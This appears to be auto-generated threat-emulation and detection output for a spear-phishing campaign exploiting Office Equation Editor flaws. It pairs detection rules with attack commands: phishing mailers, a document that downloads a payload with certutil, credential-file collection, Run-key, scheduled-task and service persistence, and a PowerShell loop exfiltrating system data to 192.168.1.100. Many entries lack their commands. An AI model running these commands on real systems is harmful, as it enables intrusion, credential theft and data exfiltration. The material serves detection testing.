extracted_ttps.description: The attacker sent a spear-phishing email with a malicious RTF document or a Microsoft Excel spreadsheet to high-ranking officers of the Rapid Action Battalion Unit of the Bangladesh police (RAB)

The adversary sends a spear-phishing email with a malicious attachment to the target, which when opened, launches the Microsoft Equation Editor application to execute the embedded equation object and downloads the payload.
indicators: List of Numbers to be verified.xlsx

extracted_ttps.description: The threat actor may use the detected tools to discover files and directories, potentially for the purpose of data exfiltration or other malicious activities.
The threat actor uses malicious URLs to exploit public-facing applications, potentially leading to the execution of malicious code.
The victim opens the malicious RTF document or Microsoft Excel spreadsheet, which launches the Equation Editor application to run the embedded objects containing the shellcode
The threat actor may use the detected malware to discover application windows, potentially for the purpose of data exfiltration or other malicious activities.
The threat actor may use the detected tools to obtain unsecured credentials, potentially for the purpose of lateral movement or other malicious activities.
The threat actor may use the detected malware to achieve boot or logon autostart execution, potentially for the purpose of maintaining persistence.
The attacker exploits known vulnerabilities in Microsoft Office (CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802) to download and run the trojan
The victim is tricked into opening the malicious attachment, which executes the embedded equation object and downloads the payload.
Detected Phishing activity via NLP pattern matching
The malware gathers the victim's hostname, operating system product name, and the victim's username.
The adversary uses the cURL command-line utility to download the payload in the Windows environment.

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The malware sends the victim's information to the C2 server.
The malware downloads and executes files from the C2 server.
The trojan allows the malicious actor to perform remote code execution
The trojan masquerades as a Windows Security update service
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Scheduled Task/Job activity via NLP pattern matching
Detected Registry Run Keys activity via NLP pattern matching
Detected User Execution: Malicious File activity via NLP pattern matching

rules.title: Suspicious Office Document Execution Leading to Command Shells (Phishing)
rules.description: Detects execution of command shells or script hosts launched by WINWORD.EXE or EXCEL.EXE, or processes started with command lines containing .rtf or .xlsx, indicating possible malicious RTF/Excel phishing payloads.

detection.condition: (selection_parent_winword and (selection_child_cmd or selection_child_ps or selection_child_wscript or selection_child_cscript or selection_child_mshta)) or (selection_parent_excel and (selection_child_cmd or selection_child_ps or selection_child_wscript or selection_child_cscript or selection_child_mshta)) or ((selection_malicious_doc or selection_malicious_doc_xlsx) and (selection_child_cmd or selection_child_ps or selection_child_wscript or selection_child_cscript or selection_child_mshta))

falsepositives: Legitimate use of Office macros that launch command shells for automation
Administrative scripts that open Excel/Word and subsequently invoke PowerShell or cmd for legitimate tasks
User-initiated execution of scripts via wscript/cscript from trusted documents

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Spearphishing Attachment – Office Document Launching Equation Editor
rules.description: Detects execution of Microsoft Equation Editor (eqnedt32.exe) or opening of known malicious Office attachment filenames by winword.exe or excel.exe, indicating a spearphishing attachment attempt.

CommandLine|contains: List of Numbers to be verified.xlsx
List of Numbers to be verified.xlsx

falsepositives: Users legitimately opening the listed documents for business purposes.
Equation Editor being launched by Office when editing equations in legitimate documents.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection of File and Directory Discovery via Built‑in Windows Utilities
rules.description: Detects execution of at.exe, net.exe, reg.exe, or sc.exe with arguments that indicate enumeration of files, directories, network shares, registry keys, or services, which are common techniques for File and Directory Discovery (ATT&CK T1083).
falsepositives: Legitimate system administration using at, net, reg, or sc for routine tasks
Scheduled task enumeration by administrators
Network share enumeration by IT staff
Registry queries for troubleshooting
Service queries for maintenance

siem_verification.message: Verification complete

rules.title: Detect Equation Editor Execution Triggered by Office Documents
rules.description: Detects execution of the Equation Editor (EQNEDT32.exe) launched from Microsoft Office applications, or any process with command line containing the term "shellcode", indicative of user execution of malicious documents.
falsepositives: Legitimate use of Equation Editor when editing equations in Word or Excel documents
Scripts or tools that include the word "shellcode" in command line arguments for testing or development purposes

siem_verification.message: Verification complete

rules.title: Application Window Discovery via Malicious Downloader
rules.description: Detects potential application window discovery by malware, which may be used for data exfiltration or other malicious activities
falsepositives: Legitimate system monitoring tools
Administrative tasks involving process or window enumeration

rules.title: Create or Modify System Process via Service or Scheduled Task Creation
rules.description: Detects creation or modification of system processes such as services or scheduled tasks using common binaries (sc.exe, schtasks.exe, powershell.exe, wmic.exe) with creation-specific command line arguments. This aligns with ATT&CK technique T1543 (Create or Modify System Process) for persistence.

detection.condition: selection_sc or selection_schtasks or selection_powershell or selection_wmic

falsepositives: Legitimate administrators creating or updating Windows services using sc.exe or PowerShell New-Service.
System maintenance tools that schedule tasks via schtasks.exe.
Automation scripts that use wmic.exe to manage processes.
Software installers that register services during deployment.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Obfuscated Files or Information via Command‑Line Utilities
rules.description: Detects execution of common Windows utilities with arguments that indicate obfuscation or encoding, such as PowerShell -enc, certutil -decode, rundll32 loading DLLs with suspicious syntax, and script hosts invoking JScript.

detection.condition: powershell_enc or powershell_encodedcommand or cmd_powershell_enc or certutil_decode or rundll32_obfus or mshta_js or cscript_obfus or wscript_obfus

falsepositives: Legitimate administrative scripts using PowerShell -EncodedCommand for automation
certutil used by administrators to decode Base64 files
mshta.exe invoked by legitimate applications to render HTML content
rundll32.exe used by Windows components for normal DLL execution
cscript.exe or wscript.exe running approved JScript or VBScript files

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Archive Collected Data via Compression Utilities
rules.description: Detects processes that create archive files (e.g., zip, 7z, tar, WinRAR, PowerShell Compress-Archive) which may indicate the ATT&CK technique T1560 – Archive Collected Data.

detection.condition: selection_archive_tool or selection_winrar or selection_powershell or selection_tar or selection_zip

falsepositives: Scheduled backup jobs that use 7z, WinRAR, or tar for legitimate archiving
System administrators running compression tools for log rotation or deployment packaging
PowerShell scripts that employ Compress-Archive for routine file packaging

attacks.command: powershell -Command "$temp = $env:TEMP; $rtfPath = Join-Path $temp 'phish.rtf'; Set-Content -Path $rtfPath -Value '{\\rtf1\\ansi\\deff0 {\\fonttbl{\\f0\\fswiss Helvetica;}} \\f0\\fs24 This is a test RTF file.}' ; Send-MailMessage -From 'attacker@example.com' -To 'victim@example.com' -Subject 'Important Document' -Body 'Please see attached.' -Attachments $rtfPath -SmtpServer 'smtp.example.com'"
attacks.description: Creates a simple RTF file in the temporary directory and emails it to a target using PowerShell's Send-MailMessage cmdlet.
attacks.expected_behavior: A file named phish.rtf is written to %TEMP% and an email with that file attached is sent via the specified SMTP server.

attacks.command: fsutil file createnew %TEMP%\\payload.bin 1024 >nul ; certutil -encode %TEMP%\\payload.bin %TEMP%\\payload.b64 >nul ; move /Y %TEMP%\\payload.b64 %TEMP%\\malicious.xls >nul ; powershell -Command "$file='%TEMP%\\malicious.xls'; Send-MailMessage -From 'phisher@bad.com' -To 'target@org.com' -Subject 'Quarterly Report' -Body 'Please review the attached report.' -Attachments $file -SmtpServer 'smtp.bad.com'"
attacks.description: Generates a dummy binary file, encodes it with certutil, renames the encoded file to an .xls spreadsheet, and emails it as an attachment.
attacks.expected_behavior: A 1 KB binary file is created, base64‑encoded, renamed to malicious.xls, and then sent as an email attachment via the specified SMTP server.

attacks.command: powershell -Command "$outlook = New-Object -ComObject Outlook.Application; $mail = $outlook.CreateItem(0); $mail.Subject = 'Urgent: Review'; $mail.Body = 'See attached file.'; $temp = $env:TEMP; $rtfPath = Join-Path $temp 'exploit.rtf'; Set-Content -Path $rtfPath -Value '{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0\\fswiss Helvetica;}}\\f0\\fs24{\\*\\objdata 0105000002000000}}'; $mail.Attachments.Add($rtfPath); $mail.To = 'victim@domain.com'; $mail.Send();"
attacks.description: Uses Outlook COM automation from PowerShell to compose and send an email with a crafted RTF attachment containing an embedded OLE object placeholder.
attacks.expected_behavior: Outlook creates a new mail item, attaches the exploit.rtf file, addresses it to the victim, and sends the message automatically.

attacks.command: printf "Dummy RTF content" > /tmp/malicious.rtf; echo "Please see attached report." | mail -s "Important Report" -a /tmp/malicious.rtf victim@example.com
attacks.description: Basic phishing email using the `mail` command with an RTF attachment.
attacks.expected_behavior: Creates a dummy RTF file in /tmp and sends an email with that file attached to victim@example.com.

attacks.command:
printf "Dummy XLS content" > /tmp/malicious.xls; (printf "From: attacker@example.com
To: victim@example.com
Subject: Quarterly Review
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY"

--BOUNDARY
Content-Type: text/plain; charset="UTF-8"

Please review the attached spreadsheet.

--BOUNDARY
Content-Type: application/vnd.ms-excel; name="report.xls"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="report.xls"

$(base64 /tmp/malicious.xls)
--BOUNDARY--
") | /usr/sbin/sendmail -t
attacks.description: Intermediate phishing email crafted manually with MIME parts using `sendmail` to attach an Excel file.
attacks.expected_behavior: Creates a dummy XLS file, builds a multipart MIME email with the file base64‑encoded, and sends it via the local sendmail service to victim@example.com.

attacks.command:
printf "Dummy RTF content" > /tmp/malicious.rtf; (printf "From: attacker@example.com
To: victim@example.com
Subject: Confidential Document
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY"

--BOUNDARY
Content-Type: text/plain; charset="UTF-8"

Please find the confidential document attached.

--BOUNDARY
Content-Type: application/rtf; name="document.rtf"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="document.rtf"

$(base64 /tmp/malicious.rtf)
--BOUNDARY--
") | /usr/sbin/sendmail -t
attacks.description: Advanced phishing email with a crafted RTF attachment using `sendmail` and proper MIME boundaries.
attacks.expected_behavior: Creates a dummy RTF file, assembles a multipart MIME email with the RTF base64‑encoded, and delivers it via sendmail to victim@example.com.

attacks.description: Creates a simple RTF file with an OLE object of class Equation.3. When the RTF is opened in Microsoft Word, Equation Editor launches, providing a vector for code execution.
attacks.expected_behavior: Opening the generated malicious.rtf in Word triggers the Equation Editor application, which would process the embedded OLE object.

attacks.description: Generates a .doc file containing an Equation Editor OLE object whose data field holds a URL to a payload. When the document is opened, Equation Editor attempts to resolve the URL, allowing the attacker to deliver a malicious executable.
attacks.expected_behavior: Opening malicious.doc in Word launches Equation Editor, which reads the embedded URL and would attempt to download the file from http://example.com/payload.exe.

attacks.command:
powershell -Command " $temp = $env:TEMP; $folder = \"$temp\\malicious_docx\"; New-Item -ItemType Directory -Path $folder -ErrorAction SilentlyContinue; $docXml = @'
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:v=\"urn:schemas-microsoft-com:vml\">
  <w:body>
    <w:p>
      <w:r>
        <w:object>
          <o:OLEObject Type=\"Embed\" ProgID=\"Equation.3\" ShapeID=\"0\" DrawAspect=\"Content\" ObjectID=\"{00000000-0000-0000-0000-000000000000}\" UpdateMode=\"Manual\">
            <o:OLEData>
              <o:Data>cmd.exe /c certutil -urlcache -split -f http://example.com/payload.exe %TEMP%\\payload.exe</o:Data>
            </o:OLEData>
          </o:OLEObject>
        </w:object>
      </w:r>
    </w:p>
    <w:sectPr/>
  </w:body>
</w:document>
'@; Set-Content -Path \"$folder\\document.xml\" -Value $docXml -Encoding UTF8; $contentTypes = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"xml\" ContentType=\"application/xml\"/></Types>'; Set-Content -Path \"$folder\\[Content_Types].xml\" -Value $contentTypes -Encoding UTF8; $rels = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"document.xml\"/></Relationships>'; New-Item -ItemType Directory -Path \"$folder\\_rels\" -ErrorAction SilentlyContinue; Set-Content -Path \"$folder\\_rels\\.rels\" -Value $rels -Encoding UTF8; Compress-Archive -Path \"$folder\\*\" -DestinationPath \"$temp\\malicious.docx\" -Force "
attacks.description: Creates a minimal DOCX package containing an OLE object of class Equation.3. The OLEData element holds a command that uses certutil to download a payload from a remote server. When the DOCX is opened, Equation Editor processes the OLE object and executes the embedded command.
attacks.expected_behavior: Opening malicious.docx in Word triggers Equation Editor, which runs the embedded cmd.exe command, causing certutil to fetch payload.exe to the %TEMP% directory (the URL is a placeholder).

attacks.description: Creates a malicious .doc attachment by decoding a placeholder base64 string representing a minimal OLE payload that would invoke Equation Editor when opened.
attacks.expected_behavior: When the victim opens the generated malicious.doc, Equation Editor is launched and attempts to execute the embedded payload (placeholder).

attacks.description: Generates a malicious RTF file containing a dummy OLE object and compresses it into a zip archive to bypass email filters.
attacks.expected_behavior: Opening the RTF from the zip triggers Equation Editor, which would process the embedded OLE object (placeholder).

attacks.command: echo "Please review the attached file." | mail -s "Invoice" -a /tmp/malicious.doc victim@example.com
attacks.description: Sends an email with the previously created malicious.doc attachment using the standard mail command, simulating a spear‑phishing delivery.
attacks.expected_behavior: The target receives an email titled "Invoice" with the malicious attachment; opening the attachment launches Equation Editor and runs the embedded payload (placeholder).

attacks.description: Lists files and directories in the current user's Documents folder using the native dir command.
attacks.expected_behavior: The command outputs a table of file names, sizes, and timestamps for items located in %USERPROFILE%\Documents.

attacks.description: Enumerates only files in the temporary directory and displays each file's name and size.
attacks.expected_behavior: A list of file names present in the %TEMP% folder is printed, each accompanied by its size in bytes.

attacks.description: Uses PowerShell with -Force to reveal hidden and system files in the user's AppData directory, showing full path, attributes, and size.
attacks.expected_behavior: Outputs a table containing the full path, attribute flags (e.g., Hidden, System), and size for each file in %APPDATA%, including those normally hidden.

attacks.description: Basic file discovery: lists files and directories in the current user's home directory.
attacks.expected_behavior: Outputs a detailed listing of files, permissions, owners, and timestamps in the user's home directory.

attacks.description: Intermediate discovery: enumerates regular files within /etc up to two directory levels deep, showing detailed metadata.
attacks.expected_behavior: Displays a long-format listing of configuration files found in /etc, suppressing permission errors.

attacks.description: Advanced discovery: searches the entire filesystem (excluding /proc) for regular files modified in the last day and smaller than 100KB, reporting name, size, and modification time.
attacks.expected_behavior: Produces a list of recently modified small files with their paths, sizes, and timestamps; requires sudo for full access.

attacks.description: Creates a minimal RTF file in the TEMP directory to simulate a malicious document.
attacks.expected_behavior: A plain RTF file is written; no execution occurs yet.

attacks.description: Writes a placeholder OLE object into an RTF file and launches it, mimicking a user opening the document which would trigger Equation Editor.
attacks.expected_behavior: The RTF file is opened with the default associated application (e.g., Word), which would load Equation Editor for the OLE object.

attacks.description: Creates a base64‑encoded RTF payload, decodes it with certutil, and opens the resulting file, emulating a user executing a malicious document.
attacks.expected_behavior: The RTF file is written and launched; the system would load Equation Editor for any embedded objects.

attacks.description: Basic scenario: creates a minimal RTF file with harmless text and opens it using the default RTF viewer (xdg-open).
attacks.expected_behavior: The system launches the associated RTF viewer (e.g., LibreOffice Writer) and displays the test document; no code execution occurs.

attacks.command: mkdir -p "$HOME/tmp" && echo '{\\rtf1\\ansi\\deff0 {\\fonttbl{\\f0\\fswiss Helvetica;}}\\f0\\fs24 Embedded object placeholder}' > "$HOME/tmp/malicious.rtf" && libreoffice --writer "$HOME/tmp/malicious.rtf"
attacks.description: Intermediate scenario: writes a slightly larger RTF containing a placeholder for an embedded object and opens it directly with LibreOffice Writer.
attacks.expected_behavior: LibreOffice Writer opens the file and renders the placeholder text; the user action simulates execution of a document that could contain malicious embedded content.

attacks.command: mkdir -p /tmp/odt && cd /tmp/odt && echo '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"><office:body><office:text><text:p>Test ODT with dummy embedded object</text:p></office:text></office:body></office:document-content>' > content.xml && zip -r malicious.odt * > /dev/null && xdg-open /tmp/odt/malicious.odt
attacks.description: Advanced scenario: constructs a minimal ODT archive (zip format) containing a simple XML payload and opens it, emulating a user opening a document that could carry embedded scripts or objects.
attacks.expected_behavior: The default ODT viewer (e.g., LibreOffice) opens the generated document; the action mirrors user execution of a crafted office file without executing any real malicious code.

attacks.description: Lists all running processes together with their window titles using the built‑in tasklist utility in verbose CSV format.
attacks.expected_behavior: Outputs a CSV list where each line contains process name, PID, session info, memory usage, status, user name, CPU time, and the Window Title column (empty for processes without a UI).

attacks.command: powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object Id, ProcessName, MainWindowTitle | Format-Table -AutoSize\"
attacks.description: Uses PowerShell to enumerate processes that own a visible window and displays their PID, process name, and window title.
attacks.expected_behavior: Prints a table of processes with non‑empty MainWindowTitle values, showing the process ID, name, and the exact title of each window.

attacks.command: powershell -Command \"Add-Type @'using System; using System.Runtime.InteropServices; public class NativeMethods { [DllImport('user32.dll', SetLastError=true)] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount); }'@; Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | ForEach-Object { $sb = New-Object System.Text.StringBuilder 256; [NativeMethods]::GetWindowText($_.MainWindowHandle, $sb, 256) | Out-Null; $title = $sb.ToString(); if($title) { Write-Output \"$($_.Id) $($_.ProcessName) $title\" } }\"
attacks.description: Advanced PowerShell script that calls the native Windows API to retrieve the exact title of each visible top‑level window via the process' MainWindowHandle.
attacks.expected_behavior: Outputs lines containing the process ID, process name, and the precise window title for every process that has a non‑zero MainWindowHandle (i.e., owns a GUI window).

attacks.description: Lists credentials stored in the Windows Credential Manager for the current user.
attacks.expected_behavior: Outputs a list of saved generic, domain, and certificate credentials, including usernames and possibly passwords.

attacks.description: Displays active network connections and mapped drives, showing any cached credentials used for authentication.
attacks.expected_behavior: Shows each network share with the associated username; passwords are not displayed but the presence of a connection indicates stored credentials.

attacks.description: Read the current user's SSH private key from the default location.
attacks.expected_behavior: If the private key file exists, its contents are printed to stdout; otherwise a message indicating its absence is displayed.

attacks.description: Search user configuration files for lines containing the word 'password', a common indicator of stored credentials.
attacks.expected_behavior: Outputs up to 20 matching lines from files under ~/.config that contain the term 'password'.

attacks.command: sudo mkdir -p /tmp/creds_dump && sudo find / -type f \( -name "*pass*" -o -name "*cred*" -o -name "*key*" \) -perm /600 2>/dev/null -exec cp {} /tmp/creds_dump/ \;
attacks.description: Perform a privileged search for files likely containing credentials and copy them to a temporary collection directory.
attacks.expected_behavior: Creates /tmp/creds_dump (if not present) and copies any readable files whose names suggest they hold credentials into that directory. Requires root privileges.

attacks.command: cmd /c "echo @echo off > %TEMP%\\test_persistence.bat && echo echo Persistence test >> %TEMP%\\test_persistence.bat && reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TestPersistence /t REG_SZ /d \"%TEMP%\\test_persistence.bat\" /f"
attacks.description: Creates a harmless batch file and adds a Run registry key for the current user to execute it at logon.
attacks.expected_behavior: A batch file is written to %TEMP% that echoes a test message; a registry entry is added under HKCU\Run so the batch file runs each time the user logs on.

attacks.command: cmd /c "echo @echo off > %TEMP%\\test_task.bat && echo echo Scheduled task executed >> %TEMP%\\test_task.bat && schtasks /Create /TN \"TestTask\" /TR \"%TEMP%\\test_task.bat\" /SC ONLOGON /RL LIMITED /F"
attacks.description: Creates a batch file and registers it as a scheduled task that runs at every logon (user‑level task).
attacks.expected_behavior: The batch file is placed in %TEMP% and a scheduled task named "TestTask" is created; the task runs the batch file automatically whenever the user logs on.

attacks.command: cmd /c "echo @echo off > %TEMP%\\svc_persistence.bat && echo echo Service started >> %TEMP%\\svc_persistence.bat && sc create TestService binPath= \"%COMSPEC% /c %TEMP%\\svc_persistence.bat\" start= auto DisplayName= \"Test Service\" && sc start TestService"
attacks.description: Creates a simple batch file and installs a Windows service that runs the batch file automatically at system start.
attacks.expected_behavior: A batch file is written to %TEMP% that echoes a message; a new service named "TestService" is created with auto‑start and is started immediately, causing the batch file to execute.

attacks.description: Basic persistence using a user crontab entry that runs a harmless script at every system reboot.
attacks.expected_behavior: On the next reboot, the script /tmp/persist.sh executes and appends "Persistence test" to $HOME/persist.log.

attacks.command:
sudo bash -c 'cat > /etc/systemd/system/persist.service <<"EOF"
[Unit]
Description=Root Persistence Test Service
After=network.target

[Service]
ExecStart=/usr/local/bin/persist_root.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF' && sudo bash -c "echo -e '#!/bin/bash\necho \"Root persistence\" >> /var/log/persist_root.log' > /usr/local/bin/persist_root.sh" && sudo chmod +x /usr/local/bin/persist_root.sh && sudo systemctl daemon-reload && sudo systemctl enable persist.service && sudo systemctl start persist.service
attacks.description: Advanced persistence by installing a system‑wide systemd service that runs as root on boot.
attacks.expected_behavior: The service starts at boot (or immediately after the start command) and repeatedly executes /usr/local/bin/persist_root.sh, which appends "Root persistence" to /var/log/persist_root.log.

attacks.description: Basic discovery: prints the computer hostname, the current user name, and the operating system product name by filtering systeminfo output.
attacks.expected_behavior: The command outputs three lines: the hostname, the username, and a line starting with 'OS Name' that contains the OS product name.

attacks.command: cmd.exe /c "wmic computersystem get name /value > %TEMP%\\sysinfo.txt & wmic os get Caption /value >> %TEMP%\\sysinfo.txt & whoami >> %TEMP%\\sysinfo.txt"
attacks.description: Intermediate discovery: uses legacy wmic binaries to retrieve the computer name and OS caption, then appends the current username, storing all results in a temporary text file.
attacks.expected_behavior: A file named sysinfo.txt is created in the user's TEMP directory containing three lines: Name=HOSTNAME, Caption=OS Product Name, and the username.

attacks.description: Advanced discovery: PowerShell gathers hostname, OS product name via CIM, and username, then outputs the data as a JSON object.
attacks.expected_behavior: The command prints a JSON string to the console, e.g., {"Hostname":"HOSTNAME","OS":"Microsoft Windows 10 Pro","Username":"DOMAIN\\User"}.

attacks.description: Basic discovery: prints the system hostname, kernel name (as a proxy for OS), and the current user.
attacks.expected_behavior: Outputs three lines: the hostname, the kernel name (e.g., Linux), and the username of the executing user.

attacks.description: Intermediate discovery: extracts the human‑readable OS product name from /etc/os-release, then shows hostname and username.
attacks.expected_behavior: First line shows something like PRETTY_NAME="Ubuntu 22.04.3 LTS", followed by the hostname and the current user on separate lines.

attacks.description: Advanced discovery: formats the collected data into a clear multi‑line report using command substitution and awk for OS extraction.
attacks.expected_behavior: Prints three labeled lines, e.g., "Hostname: myhost", "OS: Ubuntu 22.04.3 LTS", "User: alice".

attacks.description: Basic use of curl to download a benign text file to the temporary directory.
attacks.expected_behavior: The file testfile.txt is created in %TEMP% containing the content from the URL.

attacks.description: Intermediate curl usage with redirect support, integrity verification via SHA256 hash, and execution of the downloaded executable.
attacks.expected_behavior: The payload.exe file is downloaded to %TEMP%, its SHA256 hash is printed, and the executable is launched.

attacks.description: Advanced use of curl to fetch a Base64‑encoded payload, decode it with certutil, and execute the resulting binary.
attacks.expected_behavior: The Base64 file is saved as payload.b64, decoded to payload.exe in %TEMP%, and the executable is started.

attacks.description: Basic use of curl to silently download a binary payload to a temporary location.
attacks.expected_behavior: Creates the file /tmp/payload.bin containing the downloaded data.

attacks.description: Downloads a script with redirect support, stores it in a user-writable config directory, makes it executable, and runs it.
attacks.expected_behavior: The script is saved as $HOME/.config/tmp_script.sh, marked executable, and executed, producing its output in the terminal.

attacks.description: Advanced stealthy download: uses insecure TLS, runs curl inside a nohup background shell, makes the payload executable, and executes it silently.
attacks.expected_behavior: The script payload.sh is downloaded to /tmp, marked executable, and executed in the background without visible output.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Read a sample text file from the TEMP directory, URL‑encode its contents, and send it to a C2 server via an HTTP GET request.
attacks.expected_behavior: The command contacts the C2 server at 192.168.1.100 and includes the file data in the query string; no files are created or modified on the host.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Compress all files in a temporary logs folder, encode the archive in Base64, and transmit the data over a raw TCP connection to a C2 listener.
attacks.expected_behavior: A TCP connection is opened to 192.168.1.100 on port 5555; the Base64‑encoded zip archive is sent, then the connection is closed. No persistent changes are made to the system.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: powershell -Command '$script = { while($true){ $info = (systeminfo | Out-String) + \"`n\" + (ipconfig /all | Out-String); $enc = [System.Text.Encoding]::UTF8.GetBytes($info); $b64 = [Convert]::ToBase64String($enc); Invoke-WebRequest -Uri \"http://192.168.1.100/collect\" -Method POST -Body $b64 -UseBasicParsing; Start-Sleep -Seconds 300 } }; Start-Job -ScriptBlock $script'
attacks.description: Create a background PowerShell job that repeatedly gathers system information and exfiltrates it to a C2 server via HTTP POST every five minutes.
attacks.expected_behavior: A scheduled job runs in the background, sending Base64‑encoded systeminfo and ipconfig data to the C2 endpoint at regular intervals without user interaction.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration: sends the contents of /etc/hostname to the C2 server via an HTTP POST request.
attacks.expected_behavior: The C2 server receives a POST request whose body contains the hostname string; no files are created on the victim host.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration: archives multiple configuration files, streams the compressed archive over a raw TCP socket to the C2 server, then deletes the temporary archive.
attacks.expected_behavior: A TCP connection is opened to 10.0.0.1:4444; the C2 listener receives a gzip‑compressed tarball containing the two files. The temporary archive is removed afterwards.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced exfiltration: reads /etc/passwd, encodes it with base64, and places the encoded payload in a custom HTTP header to hide the data from simple body inspection.
attacks.expected_behavior: The C2 server receives an HTTP GET request with an X-Data header containing the base64‑encoded password file; no files are written on the victim host.

attacks.description: Basic ingress tool transfer using certutil to download a file to the TEMP folder and then execute it.
attacks.expected_behavior: certutil fetches the file from the URL and writes it to %TEMP%\test.exe; the subsequent command runs the downloaded executable.

attacks.description: Intermediate ingress tool transfer using bitsadmin to download the payload and then execute it.
attacks.expected_behavior: bitsadmin creates a BITS transfer job named myJob, downloads the file to %TEMP%\test.exe, and the && operator runs the downloaded file.

attacks.description: Advanced ingress tool transfer using PowerShell to download and silently execute the file.
attacks.expected_behavior: PowerShell retrieves the file from the URL, saves it to the TEMP directory, and launches it with a hidden window.

attacks.description: Basic ingress tool transfer: download a script to /tmp, make it executable, and run it.
attacks.expected_behavior: The script is fetched from the remote server, saved as /tmp/payload.sh, given execute permission, and then executed in the current session.

attacks.description: Intermediate variant using wget and background execution to persist the payload after the initiating session ends.
attacks.expected_behavior: The script is silently downloaded, marked executable, and launched as a background process detached from the terminal.

attacks.description: Advanced ingress tool transfer that places the payload in a system directory, requiring elevated privileges.
attacks.expected_behavior: With root rights, the script is written to /usr/local/bin, made executable, and then executed, demonstrating tool transfer to a privileged location.

attacks.command: sc create "SecurityUpdate" binPath= "cmd.exe /c echo ServiceTest > %TEMP%\\svc.txt" start= auto && sc start "SecurityUpdate"
attacks.description: Creates a fake Windows Security Update service using the signed binary cmd.exe to write a test file, then starts the service.
attacks.expected_behavior: A new service named SecurityUpdate is registered and started; cmd.exe runs and creates %TEMP%\svc.txt containing the text 'ServiceTest'.

attacks.description: Schedules a one‑time task that runs the signed binary powershell.exe to write a marker file, then immediately triggers the task.
attacks.expected_behavior: The task SecurityUpdateTask is created; when run, powershell.exe writes %TEMP%\task.txt with the string 'TaskRun'.

attacks.description: Creates a benign text file and uses the signed binary rundll32.exe to open it via the URL protocol handler, demonstrating proxy execution.
attacks.expected_behavior: A file %TEMP%\test.txt containing 'TestContent' is created; rundll32.exe launches the default handler (e.g., Notepad) to display the file.

attacks.description: Adds a Run registry entry under the current user to launch Notepad at logon, creating a persistent system process.
attacks.expected_behavior: The registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp is created with the value pointing to notepad.exe. Notepad will start automatically on the next user logon.

attacks.command: sc create MyService binPath= "C:\\Windows\\System32\\notepad.exe" start= auto
attacks.description: Creates a new Windows service named MyService that runs Notepad, registering a system process for persistence.
attacks.expected_behavior: A service called MyService is added to the Service Control Manager with an automatic start type. The service will launch notepad.exe each time the system boots.

attacks.description: Uses PowerShell to create a new service that runs Notepad, demonstrating a modern method to modify system processes for persistence.
attacks.expected_behavior: A service named EvilSvc is created with an automatic startup. The service will execute notepad.exe on system start, persisting the process.

attacks.command:
sudo bash -c 'cat <<EOF > /etc/systemd/system/fake.service
[Unit]
Description=Fake Service
After=network.target

[Service]
ExecStart=/usr/local/bin/fakebinary.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable fake.service && systemctl start fake.service'
attacks.description: Creates a new systemd service unit file that runs a benign script, enables it for boot, and starts it immediately.
attacks.expected_behavior: A new service named 'fake.service' appears in systemd, is enabled to start on boot, and runs /usr/local/bin/fakebinary.sh continuously.

attacks.description: Modifies the existing sshd.service unit to prepend a harmless script execution before the SSH daemon starts.
attacks.expected_behavior: The sshd.service file now includes an ExecStartPre line; on the next sshd restart, the fakebinary.sh script will run before the SSH daemon launches.

attacks.description: Creates a clear‑text file, encodes it with certutil to produce a base64‑encoded version, then removes the original file, demonstrating simple file obfuscation.
attacks.expected_behavior: A file %TEMP%\obf.txt is created containing the base64 representation of "Hello World"; the original plain.txt is deleted.

attacks.description: Executes a PowerShell command that has been base64‑encoded (UTF‑16LE), hiding the actual script (Write-Host 'Obfuscated Test') from plain view.
attacks.expected_behavior: Displays the text "Obfuscated Test" in the PowerShell console, confirming that the encoded command was decoded and executed.

attacks.description: Writes a hex‑encoded PowerShell script to a temporary file, decodes it with certutil, and runs the resulting script, demonstrating layered obfuscation (hex encoding followed by execution).
attacks.expected_behavior: Outputs "Advanced Test" via Write-Host, confirming the hex‑encoded script was decoded and executed.

attacks.description: Creates a file containing the plaintext string "Hello, world!" but stores the data in Base64 form first, demonstrating simple obfuscation.
